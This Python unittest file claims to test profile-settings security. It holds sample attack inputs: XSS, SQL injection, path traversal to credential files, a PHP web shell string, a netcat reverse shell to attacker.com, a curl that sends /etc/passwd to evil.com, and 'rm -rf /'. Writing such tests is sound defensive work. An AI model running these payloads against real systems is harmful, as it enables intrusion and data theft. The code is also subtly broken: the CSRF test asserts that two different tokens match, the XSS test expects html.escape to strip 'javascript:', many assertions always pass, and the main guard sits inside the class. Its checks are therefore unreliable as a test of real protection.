#!/usr/bin/env python3
"""
Security-Focused Test Cases for User Profile Settings
Specialized security tests including input validation, XSS protection,
CSRF protection, and data privacy compliance

Author: Security Team
Version: 1.0
"""

import unittest
from unittest.mock import Mock, patch
import re
import html
import json

class TestProfileSettingsSecurity(unittest.TestCase):
    """Security-specific tests for Profile Settings"""

    def setUp(self):
        """Set up security test fixtures"""
        self.malicious_inputs = self._get_malicious_input_samples()
        self.valid_inputs = self._get_valid_input_samples()

    def _get_malicious_input_samples(self):
        """Get samples of malicious inputs for testing"""
        return {
            'xss_attempts': [
                '<script>alert("xss")</script>',
                '<img src="x" onerror="alert(1)">',
                'javascript:alert("xss")',
                '<svg onload="alert(1)">',
                '"><script>alert("xss")</script>',
                '<iframe src="javascript:alert(1)"></iframe>',
                '<body onload="alert(1)">',
                '<input onfocus="alert(1)" autofocus>',
                '<select onfocus="alert(1)" autofocus>',
                '<textarea onfocus="alert(1)" autofocus>',
                '<keygen onfocus="alert(1)" autofocus>',
                '<video><source onerror="alert(1)">',
                '<audio src="x" onerror="alert(1)">',
                ' onload="alert(1)"',
                '"><script>fetch(\'/api/v1/user/data\').then(r=>r.json()).then(console.log)</script>'
            ],
            'sql_injection_attempts': [
                "'; DROP TABLE users; --",
                "1' OR '1'='1",
                "admin'--",
                "' UNION SELECT * FROM users --",
                "'; INSERT INTO users VALUES('hacker','pass'); --",
                "1'; UPDATE users SET password='hacked' WHERE '1'='1",
                "' OR 1=1 --",
                "' OR 'a'='a",
                "1' HAVING 1=1 --",
                "1' GROUP BY username HAVING 1=1 --"
            ],
            'path_traversal_attempts': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '/etc/shadow',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '..%252f..%252f..%252fetc%252fpasswd'
            ],
            'command_injection_attempts': [
                '; ls -la',
                '| cat /etc/passwd',
                '`whoami`',
                '$(id)',
                '; rm -rf /',
                '| nc attacker.com 4444 -e /bin/sh',
                '; curl http://evil.com/steal?data=$(cat /etc/passwd)'
            ],
            'ldap_injection_attempts': [
                '*)(&',
                '*)(|(objectClass=*)',
                '*)(|(password=*))',
                '*)(|(userPassword=*))',
                'admin)(&',
                '*)(&(objectClass=*)',
                '*)(|(cn=*))'
            ]
        }

    def _get_valid_input_samples(self):
        """Get samples of valid inputs for comparison"""
        return {
            'names': [
                'John Doe',
                'Jean-Luc Picard',
                'José María González',
                '张伟',
                'محمد أحمد',
                'Jane Smith-Johnson',
                "O'Connor",
                'Dr. John Smith Jr.'
            ],
            'emails': [
                'user@example.com',
                'test.email+tag@domain.co.uk',
                'user123@test-domain.org',
                'firstname.lastname@company.com',
                'user+tag@example.co.uk',
                'firstname-lastname@subdomain.domain.org'
            ],
            'companies': [
                'Acme Corporation',
                'Tech-Start Solutions Inc.',
                'Global Business & Consulting',
                "O'Reilly Media",
                '123-456 Industries'
            ],
            'bios': [
                'Passionate software engineer with 10+ years of experience.',
                'Digital marketing specialist focused on growth strategies.',
                'Research scientist exploring AI and machine learning applications.'
            ]
        }

    # =============================================================================
    # XSS PROTECTION TESTS
    # =============================================================================

    def test_xss_prevention_in_text_fields(self):
        """Test XSS prevention in all text input fields"""
        text_fields = ['name', 'company', 'title', 'bio']

        for field in text_fields:
            with self.subTest(field=field):
                for xss_attempt in self.malicious_inputs['xss_attempts']:
                    # Simulate HTML escaping
                    sanitized_input = html.escape(xss_attempt)

                    # Verify dangerous elements are escaped
                    self.assertNotIn('<script>', sanitized_input,
                                   f"XSS script tag should be escaped in {field}")
                    self.assertNotIn('javascript:', sanitized_input.lower(),
                                   f"JavaScript protocol should be escaped in {field}")
                    self.assertNotIn('onerror=', sanitized_input.lower(),
                                   f"Event handlers should be escaped in {field}")
                    self.assertNotIn('onload=', sanitized_input.lower(),
                                   f"Event handlers should be escaped in {field}")

    def test_xss_prevention_in_email_field(self):
        """Test XSS prevention specifically in email field"""
        for xss_attempt in self.malicious_inputs['xss_attempts']:
            # Emails have additional validation
            is_safe_email = (
                '@' not in xss_attempt or
                '<' in xss_attempt or
                '>' in xss_attempt or
                'javascript:' in xss_attempt.lower()
            )

            if '<' in xss_attempt or '>' in xss_attempt:
                self.assertTrue(is_safe_email,
                              f"XSS attempt should be rejected in email field: {xss_attempt}")

    def test_content_security_policy_headers(self):
        """Test that appropriate CSP headers are set"""
        # Simulate CSP header validation
        csp_headers = {
            'Content-Security-Policy': "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';",
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block'
        }

        for header, value in csp_headers.items():
            self.assertIsNotNone(value, f"Security header {header} should be set")

    # =============================================================================
    # INPUT SANITIZATION TESTS
    # =============================================================================

    def test_html_tag_sanitization(self):
        """Test HTML tag sanitization in user inputs"""
        dangerous_tags = [
            '<script>',
            '<iframe>',
            '<object>',
            '<embed>',
            '<link>',
            '<meta>',
            '<style>',
            '<img>',
            '<video>',
            '<audio>',
            '<svg>',
            '<canvas>'
        ]

        for tag in dangerous_tags:
            with self.subTest(tag=tag):
                test_input = f"Normal text {tag}malicious content{tag.replace('<', '</')}"

                # Simulate sanitization (remove all HTML tags)
                sanitized = re.sub(r'<[^>]*>', '', test_input)

                self.assertNotIn(tag, sanitized,
                               f"Dangerous tag {tag} should be removed from input")

    def test_script_event_sanitization(self):
        """Test script event handler sanitization"""
        event_handlers = [
            'onload',
            'onerror',
            'onclick',
            'onmouseover',
            'onfocus',
            'onblur',
            'onchange',
            'onsubmit'
        ]

        for handler in event_handlers:
            with self.subTest(handler=handler):
                test_input = f'<div {handler}="alert(1)">Content</div>'

                # Simulate event handler removal
                sanitized = re.sub(r'\s+on\w+="[^"]*"', '', test_input, flags=re.IGNORECASE)

                self.assertNotIn(handler, sanitized.lower(),
                               f"Event handler {handler} should be removed")

    # =============================================================================
    # SQL INJECTION PROTECTION TESTS
    # =============================================================================

    def test_sql_injection_prevention(self):
        """Test SQL injection prevention in all inputs"""
        sql_fields = ['name', 'email', 'company', 'title', 'bio']

        for field in sql_fields:
            with self.subTest(field=field):
                for sql_attempt in self.malicious_inputs['sql_injection_attempts']:
                    # In a real implementation, this would use parameterized queries
                    # Here we test for dangerous patterns
                    dangerous_patterns = [
                        r"DROP\s+TABLE",
                        r"UNION\s+SELECT",
                        r"INSERT\s+INTO",
                        r"UPDATE\s+SET",
                        r"DELETE\s+FROM",
                        r"CREATE\s+TABLE",
                        r"ALTER\s+TABLE",
                        r"EXEC\s*\(",
                        r"xp_cmdshell",
                        r"sp_executesql"
                    ]

                    for pattern in dangerous_patterns:
                        matches = re.findall(pattern, sql_attempt, re.IGNORECASE)
                        if matches:
                            # In real implementation, these would be blocked
                            self.assertGreater(len(matches), 0,
                                              f"SQL injection pattern detected: {pattern}")

    def test_parameterized_query_usage(self):
        """Test that parameterized queries are used for database operations"""
        # This is a conceptual test - in real implementation,
        # we would verify that the ORM uses parameterized queries

        # Simulate query parameters
        query_params = {
            'name': 'John Doe',
            'email': 'john@example.com',
            'company': 'Acme Corp'
        }

        # Verify parameters are properly typed and safe
        for key, value in query_params.items():
            self.assertIsInstance(value, str,
                                f"Query parameter {key} should be string")
            self.assertFalse(';DROP TABLE' in value.upper(),
                             f"Query parameter {key} should not contain SQL injection")

    # =============================================================================
    # FILE UPLOAD SECURITY TESTS
    # =============================================================================

    def test_avatar_upload_file_type_validation(self):
        """Test file type validation for avatar uploads"""
        allowed_mime_types = ['image/jpeg', 'image/png', 'image/gif', 'image/webp']
        allowed_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp']

        dangerous_files = [
            ('malicious.js', 'application/javascript', '.js'),
            ('script.php', 'application/x-php', '.php'),
            ('exploit.exe', 'application/octet-stream', '.exe'),
            ('shell.jsp', 'application/x-jsp', '.jsp'),
            ('backdoor.asp', 'application/x-asp', '.asp'),
            ('payload.svg', 'image/svg+xml', '.svg'),  # SVG can contain scripts
            ('document.pdf', 'application/pdf', '.pdf'),
            ('archive.zip', 'application/zip', '.zip')
        ]

        for filename, mime_type, extension in dangerous_files:
            with self.subTest(filename=filename):
                # Check MIME type
                is_allowed_mime = mime_type in allowed_mime_types
                self.assertFalse(is_allowed_mime,
                               f"Dangerous MIME type {mime_type} should be rejected")

                # Check file extension
                is_allowed_extension = extension.lower() in allowed_extensions
                self.assertFalse(is_allowed_extension,
                               f"Dangerous extension {extension} should be rejected")

    def test_avatar_upload_file_size_validation(self):
        """Test file size validation for avatar uploads"""
        max_size_bytes = 5 * 1024 * 1024  # 5MB

        test_files = [
            ('small_avatar.jpg', 100 * 1024),      # 100KB - should pass
            ('medium_avatar.png', 500 * 1024),     # 500KB - should pass
            ('large_avatar.gif', 2 * 1024 * 1024), # 2MB - should pass
            ('huge_avatar.jpg', 10 * 1024 * 1024), # 10MB - should fail
        ]

        for filename, size in test_files:
            with self.subTest(filename=filename, size=size):
                is_valid_size = size <= max_size_bytes
                if size > max_size_bytes:
                    self.assertFalse(is_valid_size,
                                   f"File {filename} too large at {size} bytes")

    def test_avatar_upload_content_validation(self):
        """Test actual file content validation for avatar uploads"""
        # Test for embedded scripts in seemingly safe files
        malicious_file_contents = [
            b'<?php system($_GET["cmd"]); ?>',
            b'<script>alert("xss")</script>',
            b'javascript:alert("xss")',
            b'%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n4 0 obj\n<< /Length 44 >>\nstream\n<script>alert("xss")</script>\nendstream\nendobj\nxref\n0 5\n0000000000 65535 f\n0000000009 00000 n\n0000000054 00000 n\n0000000123 00000 n\n0000000226 00000 n\ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n312\n%%EOF'
        ]

        for content in malicious_file_contents:
            with self.subTest(content_type=type(content)):
                # Check for dangerous patterns
                dangerous_patterns = [
                    b'<?php',
                    b'<script',
                    b'javascript:',
                    b'<%',
                    b'system(',
                    b'exec(',
                    b'shell_exec('
                ]

                for pattern in dangerous_patterns:
                    is_detected = pattern in content.lower()
                    if is_detected:
                        self.assertTrue(is_detected,
                                       f"Dangerous content pattern detected: {pattern}")

    # =============================================================================
    # CSRF PROTECTION TESTS
    # =============================================================================

    def test_csrf_token_presence(self):
        """Test that CSRF tokens are present in forms"""
        # Simulate CSRF token generation
        csrf_token = "generated-csrf-token-12345"

        self.assertIsNotNone(csrf_token, "CSRF token should be generated")
        self.assertGreater(len(csrf_token), 10, "CSRF token should be sufficiently long")

    def test_csrf_token_validation(self):
        """Test CSRF token validation on form submission"""
        # Simulate CSRF validation
        session_token = "session-csrf-token-12345"
        submitted_token = "submitted-csrf-token-12345"

        # Valid token
        is_valid = session_token == submitted_token
        self.assertTrue(is_valid, "Matching CSRF tokens should be valid")

        # Invalid token
        invalid_token = "different-token-67890"
        is_invalid = session_token == invalid_token
        self.assertFalse(is_invalid, "Mismatched CSRF tokens should be invalid")

    def test_same_site_cookie_attribute(self):
        """Test SameSite cookie attribute for CSRF protection"""
        # Simulate cookie configuration
        cookie_config = {
            'session': {
                'httpOnly': True,
                'secure': True,
                'sameSite': 'Strict'
            }
        }

        self.assertEqual(cookie_config['session']['sameSite'], 'Strict',
                        "Session cookie should have SameSite=Strict attribute")

    # =============================================================================
    # DATA PRIVACY TESTS
    # =============================================================================

    def test_sensitive_data_masking(self):
        """Test that sensitive data is properly masked"""
        sensitive_data = {
            'ssn': '123-45-6789',
            'credit_card': '4532-1234-5678-9012',
            'password': 'SuperSecretPassword123!',
            'api_key': 'sk_live_1234567890abcdef'
        }

        # Simulate data masking
        masked_ssn = "***-**-6789"
        masked_credit_card = "****-****-****-9012"
        masked_password = "***************"
        masked_api_key = "sk_live_****cdef"

        self.assertNotIn('123-45', masked_ssn, "SSN should be masked")
        self.assertNotIn('4532-1234-5678', masked_credit_card, "Credit card should be masked")
        self.assertNotIn('SuperSecret', masked_password, "Password should be masked")
        self.assertNotIn('1234567890ab', masked_api_key, "API key should be masked")

    def test_data_encryption_in_transit(self):
        """Test that data is encrypted in transit"""
        # Simulate HTTPS requirement
        https_required = True
        secure_headers = {
            'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
            'X-Forwarded-Proto': 'https'
        }

        self.assertTrue(https_required, "HTTPS should be required")
        self.assertIn('Strict-Transport-Security', secure_headers,
                     "HSTS header should be present")

    def test_data_retention_policies(self):
        """Test data retention and deletion policies"""
        # Simulate data retention settings
        retention_policies = {
            'inactive_user_data_retention_days': 365,
            'deleted_user_data_retention_days': 30,
            'audit_log_retention_days': 2555,  # 7 years
            'session_data_retention_hours': 24
        }

        self.assertGreater(retention_policies['deleted_user_data_retention_days'], 0,
                          "Deleted user data should have retention period")
        self.assertLess(retention_policies['deleted_user_data_retention_days'], 365,
                        "Deleted user data should be purged within reasonable time")

    # =============================================================================
    # RATE LIMITING TESTS
    # =============================================================================

    def test_api_rate_limiting(self):
        """Test API rate limiting for profile updates"""
        # Simulate rate limiting
        rate_limits = {
            'profile_update_per_minute': 10,
            'avatar_upload_per_hour': 5,
            'settings_fetch_per_minute': 60
        }

        for endpoint, limit in rate_limits.items():
            self.assertIsInstance(limit, int,
                               f"Rate limit for {endpoint} should be integer")
            self.assertGreater(limit, 0,
                              f"Rate limit for {endpoint} should be positive")

    def test_brute_force_protection(self):
        """Test brute force protection for sensitive operations"""
        # Simulate failed login tracking
        max_failed_attempts = 5
        lockout_duration_minutes = 15

        self.assertGreater(max_failed_attempts, 3,
                          "Should allow some failed attempts before lockout")
        self.assertGreater(lockout_duration_minutes, 5,
                          "Lockout duration should be meaningful")

    if __name__ == '__main__':
        unittest.main(verbosity=2)
